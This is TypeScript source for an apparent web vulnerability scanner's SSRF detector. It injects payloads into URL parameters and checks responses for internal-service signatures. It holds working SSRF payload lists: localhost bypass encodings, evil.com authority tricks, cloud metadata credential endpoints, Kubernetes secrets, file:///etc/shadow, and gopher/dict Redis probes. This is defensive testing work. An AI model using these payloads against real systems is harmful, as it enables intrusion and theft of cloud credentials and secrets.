import {
  IActiveDetector,
  ActiveDetectorContext,
} from '../../core/interfaces/IActiveDetector';
import { Vulnerability } from '../../types/vulnerability';
import { VulnerabilitySeverity, VulnerabilityCategory } from '../../types/enums';
import {
  AttackSurface,
  AttackSurfaceType,
} from '../../scanners/active/DomExplorer';
import {
  PayloadInjector,
  InjectionResult,
  PayloadEncoding,
} from '../../scanners/active/PayloadInjector';
import {
  IOOBClient,
  MockOOBClient,
} from '../../core/network/OOBClient';
import { Page } from 'playwright';

/**
 * SSRF Detector Configuration
 */
export interface SsrfDetectorConfig {
  // Detection strategies
  enableReflected: boolean;
  enableTiming: boolean;
  enableOOB: boolean;

  // Payload categories
  enableWafBypass: boolean;
  enableCloudMetadata: boolean;
  enableProtocolSmuggling: boolean;

  // OOB configuration
  oobClient?: IOOBClient;
  oobWaitMs: number;

  // Timing configuration
  timingThresholdMs: number;
  timingMultiplier: number;

  // Admin panel paths to check
  adminPaths: string[];
}

/**
 * Default SSRF Detector configuration
 */
const DEFAULT_CONFIG: SsrfDetectorConfig = {
  enableReflected: true,
  enableTiming: true,
  enableOOB: false,

  enableWafBypass: true,
  enableCloudMetadata: true,
  enableProtocolSmuggling: true,

  oobWaitMs: 3000,
  timingThresholdMs: 5000,
  timingMultiplier: 5,

  adminPaths: ['/admin', '/admin/', '/administrator', '/manage', '/backend'],
};

/**
 * Internal service signature for detection
 */
interface ServiceSignature {
  pattern: string | RegExp;
  service: string;
  severity: VulnerabilitySeverity;
}

/**
 * Cloud metadata payload definition
 */
interface CloudMetadataPayload {
  url: string;
  provider: string;
  signatures: string[];
  headers?: Record<string, string>;
}

/**
 * Protocol smuggling payload definition
 */
interface ProtocolPayload {
  payload: string;
  description: string;
  signatures: string[];
}

/**
 * Advanced SSRF Detector
 * A10:2025 — Server-Side Request Forgery
 *
 * Detection capabilities:
 * - Reflected/Error-Based: Detects when internal content is reflected in response
 * - Timing-Based: Detects blind SSRF via response timing analysis
 * - OOB-Based: Detects blind SSRF via out-of-band interactions
 *
 * Payload categories:
 * - WAF Bypass: Hex, Octal, Decimal, IPv6, DNS rebinding
 * - Cloud Metadata: AWS, GCP, Azure, DigitalOcean, Oracle
 * - Protocol Smuggling: file://, gopher://, dict://, ftp://
 */
export class SsrfDetector implements IActiveDetector {
  readonly name = 'Advanced SSRF Detector';
  readonly description =
    'Detects Server-Side Request Forgery with WAF bypass, cloud metadata, timing, and OOB detection';
  readonly version = '2.0.0';

  private injector: PayloadInjector;
  private config: SsrfDetectorConfig;
  private oobClient?: IOOBClient;

  constructor(config: Partial<SsrfDetectorConfig> = {}) {
    this.config = { ...DEFAULT_CONFIG, ...config };
    this.injector = new PayloadInjector();

    // Initialize OOB client if enabled
    if (this.config.enableOOB) {
      this.oobClient = this.config.oobClient ?? new MockOOBClient();
    }
  }

  // ============================================================
  // PAYLOAD GENERATORS
  // ============================================================

  /**
   * Localhost WAF bypass payloads
   * Includes: IPv6, Decimal, Hex, Octal, Short notation, DNS rebinding
   */
  private getLocalhostPayloads(): string[] {
    const payloads: string[] = [];

    // Standard localhost
    const standardPayloads = ['http://127.0.0.1', 'http://localhost'];

    // IPv6 variants
    const ipv6Payloads = [
      'http://[::1]',
      'http://[0:0:0:0:0:0:0:1]',
      'http://[::ffff:127.0.0.1]',
      'http://[0000::1]',
    ];

    // Decimal encoding (2130706433 = 127.0.0.1)
    const decimalPayloads = ['http://2130706433', 'http://0x7f000001'];

    // Hex encoding
    const hexPayloads = [
      'http://0x7f.0x0.0x0.0x1',
      'http://0x7f.0.0.1',
      'http://0x7f.1',
    ];

    // Octal encoding
    const octalPayloads = [
      'http://0177.0000.0000.0001',
      'http://0177.0.0.1',
      'http://0177.1',
      'http://017700000001',
    ];

    // Short notation
    const shortPayloads = ['http://127.1', 'http://127.0.1', 'http://127.1.1.1'];

    // 0.0.0.0 (maps to localhost on Linux)
    const zeroPayloads = ['http://0.0.0.0', 'http://0'];

    // DNS pointing to 127.0.0.1 (public DNS services)
    const dnsPayloads = [
      'http://localtest.me',
      'http://127.0.0.1.nip.io',
      'http://localhost.localdomain',
      'http://lvh.me',
    ];

    // URL authority bypass attempts
    const bypassPayloads = [
      'http://127.0.0.1:80',
      'http://127.0.0.1:443',
      'http://127.0.0.1:8080',
      'http://127.0.0.1%00@evil.com',
      'http://evil.com@127.0.0.1',
      'http://127.0.0.1#@evil.com',
    ];

    if (this.config.enableWafBypass) {
      payloads.push(
        ...standardPayloads,
        ...ipv6Payloads,
        ...decimalPayloads,
        ...hexPayloads,
        ...octalPayloads,
        ...shortPayloads,
        ...zeroPayloads,
        ...dnsPayloads,
        ...bypassPayloads
      );
    } else {
      payloads.push(...standardPayloads);
    }

    return payloads;
  }

  /**
   * Cloud metadata payloads for major cloud providers
   */
  private getCloudMetadataPayloads(): CloudMetadataPayload[] {
    if (!this.config.enableCloudMetadata) return [];

    return [
      // AWS EC2 Metadata
      {
        url: 'http://169.254.169.254/latest/meta-data/',
        provider: 'AWS',
        signatures: ['ami-id', 'instance-id', 'local-hostname'],
      },
      {
        url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        provider: 'AWS IAM',
        signatures: ['AccessKeyId', 'SecretAccessKey', 'Token'],
      },
      {
        url: 'http://169.254.169.254/latest/user-data',
        provider: 'AWS User Data',
        signatures: [],
      },
      {
        url: 'http://169.254.169.254/latest/dynamic/instance-identity/document',
        provider: 'AWS Identity',
        signatures: ['accountId', 'instanceId', 'region'],
      },

      // GCP Metadata
      {
        url: 'http://metadata.google.internal/computeMetadata/v1/',
        provider: 'GCP',
        signatures: ['computeMetadata', 'instance'],
        headers: { 'Metadata-Flavor': 'Google' },
      },
      {
        url: 'http://169.254.169.254/computeMetadata/v1/',
        provider: 'GCP',
        signatures: ['computeMetadata'],
      },
      {
        url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        provider: 'GCP Token',
        signatures: ['access_token', 'expires_in'],
      },

      // Azure IMDS
      {
        url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        provider: 'Azure',
        signatures: ['compute', 'network', 'vmId'],
        headers: { Metadata: 'true' },
      },
      {
        url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        provider: 'Azure Token',
        signatures: ['access_token'],
      },

      // DigitalOcean
      {
        url: 'http://169.254.169.254/metadata/v1/',
        provider: 'DigitalOcean',
        signatures: ['droplet_id', 'hostname', 'region'],
      },
      {
        url: 'http://169.254.169.254/metadata/v1.json',
        provider: 'DigitalOcean',
        signatures: ['droplet_id'],
      },

      // Oracle Cloud
      {
        url: 'http://169.254.169.254/opc/v1/instance/',
        provider: 'Oracle Cloud',
        signatures: ['availabilityDomain', 'compartmentId'],
      },

      // Alibaba Cloud
      {
        url: 'http://100.100.100.200/latest/meta-data/',
        provider: 'Alibaba Cloud',
        signatures: ['instance-id', 'region-id'],
      },

      // Kubernetes
      {
        url: 'https://kubernetes.default.svc/api/v1/namespaces/default/secrets',
        provider: 'Kubernetes',
        signatures: ['items', 'kind'],
      },
    ];
  }

  /**
   * Protocol smuggling payloads
   */
  private getProtocolPayloads(): ProtocolPayload[] {
    if (!this.config.enableProtocolSmuggling) return [];

    return [
      // File protocol - Linux
      {
        payload: 'file:///etc/passwd',
        description: 'Unix passwd file',
        signatures: ['root:x:0:0', 'root:', '/bin/bash', '/bin/sh'],
      },
      {
        payload: 'file:///etc/shadow',
        description: 'Unix shadow file',
        signatures: ['root:$'],
      },
      {
        payload: 'file:///etc/hosts',
        description: 'Unix hosts file',
        signatures: ['localhost', '127.0.0.1'],
      },
      {
        payload: 'file:///proc/self/environ',
        description: 'Process environment',
        signatures: ['PATH=', 'HOME=', 'USER='],
      },
      {
        payload: 'file:///proc/self/cmdline',
        description: 'Process command line',
        signatures: [],
      },

      // File protocol - Windows
      {
        payload: 'file:///C:/Windows/win.ini',
        description: 'Windows config',
        signatures: ['[fonts]', '[extensions]', '[files]'],
      },
      {
        payload: 'file:///C:/Windows/System32/drivers/etc/hosts',
        description: 'Windows hosts',
        signatures: ['localhost', '127.0.0.1'],
      },

      // Gopher protocol (Redis exploitation)
      {
        payload: 'gopher://127.0.0.1:6379/_INFO',
        description: 'Redis info via Gopher',
        signatures: ['redis_version', 'connected_clients', 'used_memory'],
      },
      {
        payload: 'gopher://127.0.0.1:6379/_CONFIG%20GET%20*',
        description: 'Redis config dump',
        signatures: ['dbfilename', 'dir'],
      },

      // Dict protocol
      {
        payload: 'dict://127.0.0.1:6379/INFO',
        description: 'Redis via Dict',
        signatures: ['redis_version', 'connected_clients'],
      },
      {
        payload: 'dict://127.0.0.1:11211/stats',
        description: 'Memcached stats',
        signatures: ['STAT pid', 'STAT uptime', 'STAT version'],
      },

      // FTP protocol
      {
        payload: 'ftp://127.0.0.1:21/',
        description: 'Internal FTP',
        signatures: ['FTP server', '220 '],
      },

      // LDAP
      {
        payload: 'ldap://127.0.0.1:389/',
        description: 'Internal LDAP',
        signatures: ['ldap', 'objectClass'],
      },
    ];
  }

  /**
   * Internal service signatures for detection
   */
  private getServiceSignatures(): ServiceSignature[] {
    return [
      // File system
      {
        pattern: 'root:x:0:0',
        service: '/etc/passwd',
        severity: VulnerabilitySeverity.CRITICAL,
      },
      {
        pattern: /root:\$\d+\$/,
        service: '/etc/shadow',
        severity: VulnerabilitySeverity.CRITICAL,
      },

      // Database services
      {
        pattern: 'redis_version',
        service: 'Redis',
        severity: VulnerabilitySeverity.HIGH,
      },
      {
        pattern: 'STAT pid',
        service: 'Memcached',
        severity: VulnerabilitySeverity.HIGH,
      },
      {
        pattern: 'mysql_native_password',
        service: 'MySQL',
        severity: VulnerabilitySeverity.HIGH,
      },
      {
        pattern: 'PostgreSQL',
        service: 'PostgreSQL',
        severity: VulnerabilitySeverity.HIGH,
      },
      {
        pattern: 'MongoDB server version',
        service: 'MongoDB',
        severity: VulnerabilitySeverity.HIGH,
      },

      // Network services
      {
        pattern: 'SSH-2.0',
        service: 'SSH',
        severity: VulnerabilitySeverity.MEDIUM,
      },
      {
        pattern: 'FTP server ready',
        service: 'FTP',
        severity: VulnerabilitySeverity.MEDIUM,
      },
      {
        pattern: '220 ',
        service: 'SMTP/FTP Banner',
        severity: VulnerabilitySeverity.LOW,
      },

      // Web servers
      {
        pattern: 'Apache Server Status',
        service: 'Apache mod_status',
        severity: VulnerabilitySeverity.MEDIUM,
      },
      {
        pattern: 'nginx/',
        service: 'Nginx',
        severity: VulnerabilitySeverity.LOW,
      },
      {
        pattern: 'Server: Apache',
        service: 'Apache',
        severity: VulnerabilitySeverity.LOW,
      },

      // Cloud metadata
      {
        pattern: 'ami-id',
        service: 'AWS Metadata',
        severity: VulnerabilitySeverity.CRITICAL,
      },
      {
        pattern: 'AccessKeyId',
        service: 'AWS IAM Credentials',
        severity: VulnerabilitySeverity.CRITICAL,
      },
      {
        pattern: 'computeMetadata',
        service: 'GCP Metadata',
        severity: VulnerabilitySeverity.CRITICAL,
      },
      {
        pattern: 'vmId',
        service: 'Azure Metadata',
        severity: VulnerabilitySeverity.CRITICAL,
      },
      {
        pattern: 'droplet_id',
        service: 'DigitalOcean Metadata',
        severity: VulnerabilitySeverity.CRITICAL,
      },

      // Docker
      {
        pattern: 'docker',
        service: 'Docker',
        severity: VulnerabilitySeverity.MEDIUM,
      },
      {
        pattern: '/var/run/docker.sock',
        service: 'Docker Socket',
        severity: VulnerabilitySeverity.CRITICAL,
      },

      // Kubernetes
      {
        pattern: 'kubernetes',
        service: 'Kubernetes',
        severity: VulnerabilitySeverity.HIGH,
      },
      {
        pattern: 'serviceaccount',
        service: 'K8s Service Account',
        severity: VulnerabilitySeverity.HIGH,
      },

      // Admin panels (for PortSwigger labs)
      {
        pattern: /delete.*carlos/i,
        service: 'Admin Panel',
        severity: VulnerabilitySeverity.CRITICAL,
      },
      {
        pattern: /Delete user/i,
        service: 'Admin Panel',
        severity: VulnerabilitySeverity.CRITICAL,
      },
    ];
  }

  // ============================================================
  // MAIN DETECTION LOGIC
  // ============================================================

  async detect(context: ActiveDetectorContext): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    const { page, attackSurfaces, baseUrl } = context;

    this.injector.setSafeMode(context.safeMode ?? false);

    // Filter for URL-like attack surfaces
    const targets = this.filterUrlSurfaces(attackSurfaces);

    for (const surface of targets) {
      // Strategy 1: Reflected/Error-Based Detection
      if (this.config.enableReflected) {
        const reflectedVuln = await this.detectReflectedSSRF(
          page,
          surface,
          baseUrl
        );
        if (reflectedVuln) {
          vulnerabilities.push(reflectedVuln);
          continue; // Found vulnerability, skip other strategies for this surface
        }
      }

      // Strategy 2: Timing-Based Blind Detection
      if (this.config.enableTiming) {
        const timingVuln = await this.detectTimingSSRF(page, surface, baseUrl);
        if (timingVuln) {
          vulnerabilities.push(timingVuln);
          continue;
        }
      }

      // Strategy 3: OOB-Based Blind Detection
      if (this.config.enableOOB && this.oobClient) {
        const oobVuln = await this.detectOOBSSRF(page, surface, baseUrl);
        if (oobVuln) {
          vulnerabilities.push(oobVuln);
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Filter attack surfaces that might handle URLs
   */
  private filterUrlSurfaces(surfaces: AttackSurface[]): AttackSurface[] {
    const urlKeywords = [
      'url',
      'link',
      'image',
      'host',
      'uri',
      'callback',
      'webhook',
      'stock',
      'api',
      'path',
      'redirect',
      'fetch',
      'load',
      'src',
      'href',
      'dest',
      'target',
      'site',
      'domain',
      'endpoint',
      'service',
      'proxy',
      'forward',
      'next',
      'return',
      'continue',
      'goto',
    ];

    return surfaces.filter((s) => {
      const name = s.name.toLowerCase();
      const isUrlType =
        s.type === AttackSurfaceType.FORM_INPUT ||
        s.type === AttackSurfaceType.URL_PARAMETER ||
        s.type === AttackSurfaceType.API_PARAM ||
        s.type === AttackSurfaceType.JSON_BODY;

      return isUrlType && urlKeywords.some((kw) => name.includes(kw));
    });
  }

  // ============================================================
  // DETECTION STRATEGIES
  // ============================================================

  /**
   * Strategy 1: Reflected/Error-Based SSRF Detection
   */
  private async detectReflectedSSRF(
    page: Page,
    surface: AttackSurface,
    baseUrl: string
  ): Promise<Vulnerability | null> {
    // Test 1: Admin panel access (PortSwigger labs style)
    for (const adminPath of this.config.adminPaths) {
      for (const localhostPayload of this.getLocalhostPayloads().slice(0, 5)) {
        const payload = localhostPayload + adminPath;
        try {
          const result = await this.injector.inject(page, surface, payload, {
            encoding: PayloadEncoding.NONE,
            submit: true,
            baseUrl,
          });

          const body = result.response?.body || '';
          const signature = this.detectServiceSignature(body);

          if (signature.found) {
            return this.createVulnerability(
              surface,
              payload,
              result,
              `Critical SSRF: ${signature.service} Access`,
              signature.severity,
              0.95
            );
          }

          // Specific check for admin panel content
          if (this.hasAdminPanelContent(body)) {
            return this.createVulnerability(
              surface,
              payload,
              result,
              'Critical SSRF: Admin Panel Access',
              VulnerabilitySeverity.CRITICAL,
              0.95
            );
          }
        } catch {
          // Continue with next payload
        }
      }
    }

    // Test 2: Full localhost bypass payloads
    for (const payload of this.getLocalhostPayloads()) {
      try {
        const result = await this.injector.inject(page, surface, payload, {
          encoding: PayloadEncoding.NONE,
          submit: true,
          baseUrl,
        });

        const body = result.response?.body || '';
        const signature = this.detectServiceSignature(body);

        if (signature.found) {
          return this.createVulnerability(
            surface,
            payload,
            result,
            `SSRF: Internal Service (${signature.service})`,
            signature.severity,
            0.9
          );
        }
      } catch {
        // Continue
      }
    }

    // Test 3: Cloud metadata extraction
    for (const cloudPayload of this.getCloudMetadataPayloads()) {
      try {
        const result = await this.injector.inject(
          page,
          surface,
          cloudPayload.url,
          {
            encoding: PayloadEncoding.NONE,
            submit: true,
            baseUrl,
          }
        );

        const body = result.response?.body || '';

        // Check for cloud-specific signatures
        for (const sig of cloudPayload.signatures) {
          if (body.includes(sig)) {
            return this.createVulnerability(
              surface,
              cloudPayload.url,
              result,
              `Critical SSRF: ${cloudPayload.provider} Metadata Leak`,
              VulnerabilitySeverity.CRITICAL,
              0.95
            );
          }
        }
      } catch {
        // Continue
      }
    }

    // Test 4: Protocol smuggling
    for (const protocolPayload of this.getProtocolPayloads()) {
      try {
        const result = await this.injector.inject(
          page,
          surface,
          protocolPayload.payload,
          {
            encoding: PayloadEncoding.NONE,
            submit: true,
            baseUrl,
          }
        );

        const body = result.response?.body || '';

        for (const sig of protocolPayload.signatures) {
          if (body.includes(sig)) {
            return this.createVulnerability(
              surface,
              protocolPayload.payload,
              result,
              `SSRF: ${protocolPayload.description}`,
              VulnerabilitySeverity.HIGH,
              0.9
            );
          }
        }
      } catch {
        // Continue
      }
    }

    return null;
  }

  /**
   * Strategy 2: Timing-Based Blind SSRF Detection
   */
  private async detectTimingSSRF(
    page: Page,
    surface: AttackSurface,
    baseUrl: string
  ): Promise<Vulnerability | null> {
    try {
      // Step 1: Measure baseline with current value or known fast URL
      const baselineStart = Date.now();
      await this.injector.inject(page, surface, 'http://example.com', {
        encoding: PayloadEncoding.NONE,
        submit: true,
        baseUrl,
      });
      const baselineDuration = Date.now() - baselineStart;

      // Step 2: Test with non-routable IP that should cause timeout
      // 10.255.255.1 is typically a non-routable private IP that will DROP packets
      const timeoutPayload = 'http://10.255.255.1:80';
      const timeoutStart = Date.now();

      try {
        await this.injector.inject(page, surface, timeoutPayload, {
          encoding: PayloadEncoding.NONE,
          submit: true,
          baseUrl,
        });
      } catch {
        // Expected - timeout or error
      }

      const timeoutDuration = Date.now() - timeoutStart;

      // Step 3: Compare timings
      // If timeout payload took significantly longer, the server likely tried to connect
      if (
        timeoutDuration > this.config.timingThresholdMs &&
        timeoutDuration > baselineDuration * this.config.timingMultiplier
      ) {
        return this.createVulnerability(
          surface,
          timeoutPayload,
          {
            payload: timeoutPayload,
            encoding: PayloadEncoding.NONE,
            strategy: 'replace' as any,
            surface,
            response: { url: page.url(), status: 0, body: '', headers: {}, timing: 0 },
          },
          'Potential Blind SSRF (Timing-Based)',
          VulnerabilitySeverity.MEDIUM,
          0.6 // Lower confidence for timing-based
        );
      }
    } catch {
      // Timing analysis failed
    }

    return null;
  }

  /**
   * Strategy 3: OOB-Based Blind SSRF Detection
   */
  private async detectOOBSSRF(
    page: Page,
    surface: AttackSurface,
    baseUrl: string
  ): Promise<Vulnerability | null> {
    if (!this.oobClient) return null;

    try {
      // Step 1: Generate unique callback URL
      const { url, id } = await this.oobClient.generatePayload();

      // Step 2: Inject the payload
      await this.injector.inject(page, surface, url, {
        encoding: PayloadEncoding.NONE,
        submit: true,
        baseUrl,
      });

      // Step 3: Wait for potential callback
      await page.waitForTimeout(this.config.oobWaitMs);

      // Step 4: Check for interactions
      const interactions = await this.oobClient.checkInteractions(id);

      if (interactions.length > 0) {
        const interaction = interactions[0];
        const protocolName = interaction?.protocol?.toUpperCase() ?? 'UNKNOWN';
        return this.createVulnerability(
          surface,
          url,
          {
            payload: url,
            encoding: PayloadEncoding.NONE,
            strategy: 'replace' as any,
            surface,
            response: { url: page.url(), status: 0, body: '', headers: {}, timing: 0 },
          },
          `Blind SSRF (OOB via ${protocolName})`,
          VulnerabilitySeverity.HIGH,
          0.95 // High confidence for confirmed OOB
        );
      }
    } catch {
      // OOB check failed
    }

    return null;
  }

  // ============================================================
  // HELPER METHODS
  // ============================================================

  /**
   * Detect internal service signatures in response body
   */
  private detectServiceSignature(body: string): {
    found: boolean;
    service: string;
    severity: VulnerabilitySeverity;
  } {
    for (const sig of this.getServiceSignatures()) {
      const isMatch =
        sig.pattern instanceof RegExp
          ? sig.pattern.test(body)
          : body.includes(sig.pattern);

      if (isMatch) {
        return { found: true, service: sig.service, severity: sig.severity };
      }
    }

    return { found: false, service: '', severity: VulnerabilitySeverity.INFO };
  }

  /**
   * Check for admin panel content (PortSwigger labs style)
   */
  private hasAdminPanelContent(body: string): boolean {
    const adminIndicators = [
      // User management
      /delete.*user/i,
      /delete.*carlos/i,
      /delete.*administrator/i,
      /user.*management/i,
      /admin.*panel/i,
      /admin.*interface/i,
      /administrator/i,
      // Action buttons
      /<form.*action.*delete/i,
      /<a.*href.*delete/i,
      /<button.*delete/i,
    ];

    return adminIndicators.some((pattern) => pattern.test(body));
  }

  /**
   * Create vulnerability object
   */
  private createVulnerability(
    surface: AttackSurface,
    payload: string,
    result: InjectionResult,
    title: string,
    severity: VulnerabilitySeverity,
    confidence: number = 0.9
  ): Vulnerability {
    return {
      id: `ssrf-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      title,
      description: `SSRF detected in ${surface.name}. The server made a request to an internal or restricted resource.`,
      severity,
      category: VulnerabilityCategory.SECURITY_MISCONFIGURATION,
      cwe: 'CWE-918',
      owasp: 'A10:2025',
      url: result.response?.url || '',
      confidence,
      evidence: {
        payload,
        request: { body: payload },
        response: {
          body: result.response?.body?.substring(0, 1000),
          status: result.response?.status,
        },
      },
      remediation: this.getRemediation(payload),
      references: [
        'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
        'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
        'https://portswigger.net/web-security/ssrf',
      ],
      timestamp: new Date(),
      detectorId: 'ssrf',
    };
  }

  /**
   * Get remediation advice based on payload type
   */
  private getRemediation(payload: string): string {
    if (payload.startsWith('file://')) {
      return 'Disable file:// protocol handler. Validate and sanitize all user-supplied URLs. Use an allowlist of permitted domains and protocols.';
    }
    if (payload.startsWith('gopher://') || payload.startsWith('dict://')) {
      return 'Disable dangerous protocol handlers (gopher://, dict://). Only allow http:// and https:// schemes.';
    }
    if (payload.includes('169.254.169.254') || payload.includes('metadata')) {
      return 'Block access to cloud metadata endpoints (169.254.169.254). Use IMDSv2 on AWS. Deploy network policies to prevent metadata access.';
    }
    return 'Validate and sanitize all user-supplied URLs. Use an allowlist of permitted domains. Disable unused URL schemes. Implement network segmentation to prevent internal access.';
  }

  // ============================================================
  // INTERFACE METHODS
  // ============================================================

  async validate(): Promise<boolean> {
    return true;
  }

  getPatterns(): RegExp[] {
    return [];
  }

  async analyzeInjectionResult(
    _result: InjectionResult
  ): Promise<Vulnerability[]> {
    return [];
  }

  getPayloads(): string[] {
    return [
      ...this.getLocalhostPayloads(),
      ...this.getCloudMetadataPayloads().map((p) => p.url),
      ...this.getProtocolPayloads().map((p) => p.payload),
    ];
  }

  /**
   * Cleanup OOB client resources
   */
  async cleanup(): Promise<void> {
    if (this.oobClient?.cleanup) {
      await this.oobClient.cleanup();
    }
  }
}
